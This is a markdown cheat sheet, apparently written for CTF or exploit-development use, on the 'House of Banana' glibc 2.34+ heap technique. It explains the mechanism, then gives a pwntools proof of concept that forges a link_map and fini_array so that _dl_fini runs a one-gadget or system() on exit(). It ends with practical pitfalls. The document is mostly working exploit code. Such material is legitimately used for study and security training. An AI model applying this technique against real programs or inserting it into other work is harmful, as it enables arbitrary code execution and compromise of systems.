# House of Banana

**When**: glibc 2.34+. Need arbitrary write (single large bin attack suffices).
**Primitive needed**: Large bin attack (write heap address to a chosen location).
**Result**: Code execution when the program exits normally (via `_dl_fini`).

## Mechanism
On `exit()`, the dynamic linker calls `_dl_fini` which iterates `_rtld_global._dl_ns[0]._ns_loaded` — a linked list of loaded objects — and calls each object's `.fini_array` functions. Overwrite `_rtld_global._dl_ns[0]._ns_loaded` with a pointer to a fake `link_map` struct containing a fake `.fini_array` that points to `system` or a one-gadget.

## PoC
```python
# IN: large bin attack primitive, libc leak, heap control
# OUT: code execution on exit()
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')  # or extract from libc
p = process('./binary')

# Key addresses
rtld_global = ld.sym['_rtld_global']  # in ld.so, not libc
ns_loaded_offset = 0  # _dl_ns[0]._ns_loaded is at the start of _rtld_global
target_write = rtld_global + ns_loaded_offset

# Step 1: Large bin attack to write heap_addr → _rtld_global._dl_ns[0]._ns_loaded
# (overwrites the head of the loaded-objects linked list)
large_bin_attack(target_write, controlled_heap_addr)

# Step 2: Forge fake link_map struct at controlled_heap_addr
# _dl_fini reads: l_addr, l_info[DT_FINI_ARRAY], l_info[DT_FINI_ARRAYSZ], l_next
fake_link_map = bytearray(0x400)

# l_addr: base offset added to fini_array entries (set to 0)
struct.pack_into('<Q', fake_link_map, 0x0, 0)

# l_next: NULL (end of linked list)
struct.pack_into('<Q', fake_link_map, 0x18, 0)

# l_info[DT_FINI_ARRAY] (index 26): pointer to fake Elf64_Dyn
fini_array_dyn_addr = controlled_heap_addr + 0x300
struct.pack_into('<Q', fake_link_map, 0x110, fini_array_dyn_addr)  # l_info[26]

# l_info[DT_FINI_ARRAYSZ] (index 28): pointer to fake Elf64_Dyn for size
fini_arraysz_dyn_addr = controlled_heap_addr + 0x310
struct.pack_into('<Q', fake_link_map, 0x120, fini_arraysz_dyn_addr)

# Fake Elf64_Dyn entries
# DT_FINI_ARRAY: d_val = address of function pointer array
fini_func_array_addr = controlled_heap_addr + 0x320
struct.pack_into('<QQ', fake_link_map, 0x300, 26, fini_func_array_addr)  # tag, val
struct.pack_into('<QQ', fake_link_map, 0x310, 28, 8)  # tag, val (size = 8 = one pointer)

# Function pointer array: [one_gadget] or [system]
struct.pack_into('<Q', fake_link_map, 0x320, one_gadget_addr)

edit(target_idx, bytes(fake_link_map))

# Step 3: exit() → _dl_fini → calls our one_gadget
trigger_exit()
p.interactive()
```

## Trap
- `_rtld_global` lives in `ld-linux-x86-64.so.2`, not `libc`. You need the ld base address (can sometimes compute from libc base).
- The fake `link_map` must have `l_init_called` set and specific flags clear to enter the fini path.
- Only needs a single large bin attack write — no tcache poisoning needed.
- Offsets within `link_map` vary by glibc version — verify with `pahole` or debugger.
